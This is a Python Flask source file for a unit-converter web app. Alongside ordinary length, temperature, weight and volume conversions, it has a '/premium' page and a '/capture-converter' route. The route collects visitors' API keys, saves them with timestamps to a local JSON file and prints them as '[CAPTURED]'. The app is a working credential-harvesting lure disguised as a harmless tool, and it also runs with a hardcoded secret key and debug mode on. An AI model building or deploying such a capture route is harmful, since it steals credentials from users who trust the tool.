import os
import json
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session

app = Flask(__name__)
app.secret_key = "unit-converter-secret-key"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURE_FILE = os.path.join(BASE_DIR, "captured_converter.json")

# ── Conversion logic ──────────────────────────────────────────────

CONVERSIONS = {
    ("meter", "kilometer"): lambda v: v / 1000,
    ("kilometer", "meter"): lambda v: v * 1000,
    ("meter", "centimeter"): lambda v: v * 100,
    ("centimeter", "meter"): lambda v: v / 100,
    ("kilometer", "centimeter"): lambda v: v * 100000,
    ("centimeter", "kilometer"): lambda v: v / 100000,
    ("celsius", "fahrenheit"): lambda v: (v * 9 / 5) + 32,
    ("fahrenheit", "celsius"): lambda v: (v - 32) * 5 / 9,
    ("kilogram", "gram"): lambda v: v * 1000,
    ("gram", "kilogram"): lambda v: v / 1000,
    ("kilogram", "pound"): lambda v: v * 2.20462,
    ("pound", "kilogram"): lambda v: v / 2.20462,
    ("mile", "kilometer"): lambda v: v * 1.60934,
    ("kilometer", "mile"): lambda v: v / 1.60934,
    ("inch", "centimeter"): lambda v: v * 2.54,
    ("centimeter", "inch"): lambda v: v / 2.54,
    ("liter", "gallon"): lambda v: v * 0.264172,
    ("gallon", "liter"): lambda v: v / 0.264172,
}

UNIT_LABELS = {
    "meter": "Meters",
    "kilometer": "Kilometers",
    "centimeter": "Centimeters",
    "celsius": "Celsius",
    "fahrenheit": "Fahrenheit",
    "kilogram": "Kilograms",
    "gram": "Grams",
    "pound": "Pounds",
    "mile": "Miles",
    "inch": "Inches",
    "liter": "Liters",
    "gallon": "Gallons",
}


def ensure_capture_file():
    if not os.path.exists(CAPTURE_FILE):
        with open(CAPTURE_FILE, "w") as f:
            json.dump({"entries": []}, f, indent=2)


# ── Routes ────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html", units=UNIT_LABELS)


@app.route("/convert", methods=["POST"])
def convert():
    value = request.form.get("value", "")
    from_unit = request.form.get("from_unit", "")
    to_unit = request.form.get("to_unit", "")

    try:
        numeric_value = float(value)
    except (ValueError, TypeError):
        return redirect(url_for("index"))

    if from_unit == to_unit:
        result_value = numeric_value
    else:
        converter = CONVERSIONS.get((from_unit, to_unit))
        if converter is None:
            return render_template(
                "result.html",
                error=True,
                message=f"Conversion from {UNIT_LABELS.get(from_unit, from_unit)} to {UNIT_LABELS.get(to_unit, to_unit)} is not supported.",
            )
        result_value = converter(numeric_value)

    # Format output
    if result_value == int(result_value):
        result_str = str(int(result_value))
    else:
        result_str = f"{result_value:.6g}"

    from_label = UNIT_LABELS.get(from_unit, from_unit)
    to_label = UNIT_LABELS.get(to_unit, to_unit)

    session["last_conversion"] = {
        "value": value,
        "from_unit": from_unit,
        "to_unit": to_unit,
        "result": result_str,
        "from_label": from_label,
        "to_label": to_label,
    }

    return render_template(
        "result.html",
        error=False,
        value=value,
        from_label=from_label,
        to_label=to_label,
        result=result_str,
    )


@app.route("/premium")
def premium():
    return render_template("premium.html")


@app.route("/capture-converter", methods=["POST"])
def capture_converter():
    api_key = request.form.get("api_key", "")

    ensure_capture_file()

    with open(CAPTURE_FILE, "r") as f:
        data = json.load(f)

    entry = {
        "api_key": api_key,
        "timestamp": datetime.now().isoformat(),
    }

    data["entries"].append(entry)

    with open(CAPTURE_FILE, "w") as f:
        json.dump(data, f, indent=2)

    print(f"\n[CAPTURED] API Key: {api_key}")
    print(f"[CAPTURED] Timestamp: {entry['timestamp']}\n")

    return redirect(url_for("success"))


@app.route("/success")
def success():
    return render_template("success.html")


if __name__ == "__main__":
    ensure_capture_file()
    print("Unit Converter running at http://127.0.0.1:5000")
    app.run(debug=True, port=5000)
